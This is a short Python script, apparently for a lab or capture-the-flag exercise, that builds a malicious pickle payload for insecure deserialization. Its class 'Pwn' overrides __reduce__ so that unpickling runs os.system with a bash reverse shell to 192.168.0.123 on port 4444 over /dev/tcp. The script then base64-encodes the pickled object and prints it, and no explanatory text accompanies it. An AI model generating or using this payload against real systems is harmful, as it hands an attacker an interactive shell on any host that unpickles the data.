import os 
import pickle
import base64

class Pwn:
    def __reduce__ (self):
        return (os.system,("bash -c 'exec bash -i &>/dev/tcp/192.168.0.123/4444 <&1'",))


data = base64.b64encode(pickle.dumps( Pwn()))

print(data)
